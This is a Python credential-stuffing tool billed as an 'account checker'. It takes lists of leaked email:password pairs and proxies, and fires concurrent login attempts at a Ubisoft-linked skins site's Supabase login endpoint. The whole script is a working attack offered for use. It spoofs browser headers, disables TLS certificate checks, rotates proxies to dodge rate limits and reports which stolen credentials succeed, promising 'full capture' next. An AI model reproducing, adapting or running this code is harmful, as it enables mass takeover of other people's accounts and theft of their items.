#@l.eaks on dc 
import aiohttp
import asyncio
import base64
import random
import ssl
from aiohttp_socks import ProxyConnector
from aiohttp import ClientTimeout, TCPConnector
from colorama import init, Fore


LOGIN_URL = "https://pixzimabgpstodnphttd.supabase.co/functions/v1/ubi_login2"
DEFAULT_TIMEOUT = 10
MAX_RETRIES = 2

async def display_startup():
    startup_message = r"""
: ¨·.·¨ :
 ` ·. 🦋
                  ╱|、                   
                (˚ˎ 。7  
                 |、˜〵          
                じしˍ,)ノ                                             
""" 
    print(Fore.BLUE + startup_message)
    await asyncio.sleep(1) 
    print("\nAccount checker in v1.0 made by @l.eaks on dc")
    print("\nProxy Format socks5://ip:port and http(s)://ip:port")
    print(" ")
    print("Might add Full Capture Soon... and maybe if 2fa is enabled")
    print("\n1: Start checker\n")

async def load_accounts():
    file_path = input("Please enter the full path for accounts.txt: ")
    
    accounts = []
    with open(file_path, "r") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line:
                email, password = line.split(":", 1)
                accounts.append((email, password))
    return accounts

async def load_proxies():
    file_path = input("Please enter the full path for proxies.txt: ")
        
    proxies = []
    with open(file_path, "r") as f:
        for line in f:
            proxy = line.strip()
            if proxy:
                proxies.append(proxy)
    return proxies

async def login(email, password, proxy):
    credentials = f"{email}:{password}"
    token = base64.b64encode(credentials.encode()).decode()
    payload = {"token": token, "uuid": None}

    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Origin": "https://cndrd.xyz",
        "Referer": "https://cndrd.xyz/"
    }

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    if proxy.startswith("socks5://"):
        connector = ProxyConnector.from_url(proxy)
    elif proxy.startswith("http://") or proxy.startswith("https://"):
        connector = TCPConnector(ssl=ssl_context)
    else:
        print(f"Unsupported proxy format: {proxy}")
        return None

    for attempt in range(MAX_RETRIES):
        try:
            print(f"Creating session for {email} with proxy {proxy}")
            async with aiohttp.ClientSession(connector=connector) as session:
                timeout = ClientTimeout(total=DEFAULT_TIMEOUT)
                async with session.post(LOGIN_URL, json=payload, headers=headers, ssl=ssl_context, timeout=timeout) as response:
                    if response.status == 200:
                        response_json = await response.json()
                        if response_json.get("error") == "":
                            user_id = response_json.get("ubi_id")
                            profile_url = f"https://siegeskins.com/profile/{user_id}"
                            return f"Login successful! Email: {email} | Username: {response_json.get('ubi_name')} | Profile URL: {profile_url}"
                    else:
                        print(f"Failed login for {email}. Status: {response.status}") 
        except asyncio.TimeoutError:
            print(f"Timeout error for {email} on proxy {proxy}. Retrying...")
        except aiohttp.ClientError as e:
            print(f"Client error for {email} using proxy {proxy}: {str(e)}. Retrying...")
        except Exception as e:
            print(f"Unexpected error for {email} using proxy {proxy}: {str(e)}. Retrying...")

async def main():
    await display_startup() 
    user_input = input("Enter '1' to start the checker: ")

    if user_input == '1':
        accounts = await load_accounts() 
        proxies = await load_proxies()
        
        tasks = [
            login(email, password, random.choice(proxies)) 
            for email, password in accounts
        ]
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:  
                print(result)
    else:
        print("Invalid option selected. Exiting.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if 'There is no current event loop' in str(e):
            loop = asyncio.get_event_loop()
            loop.run_until_complete(main())
        else:
            print(f"Unexpected error: {e}")
